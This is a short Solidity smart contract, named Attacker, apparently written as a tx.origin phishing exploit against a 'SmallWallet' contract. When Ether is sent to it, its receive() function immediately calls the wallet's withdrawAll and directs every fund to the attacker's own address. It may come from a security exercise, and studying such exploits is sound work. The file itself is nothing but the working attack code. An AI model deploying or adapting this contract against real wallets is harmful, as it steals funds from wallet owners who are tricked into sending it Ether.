// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISmallWallet {
    function withdrawAll(address recipient) external payable; 
}

contract Attacker is Ownable {
    ISmallWallet private immutable smallWallet;

    constructor(ISmallWallet _smallWallet) {
        smallWallet = _smallWallet;
    }

    receive() external payable {
        smallWallet.withdrawAll(owner());
    }
}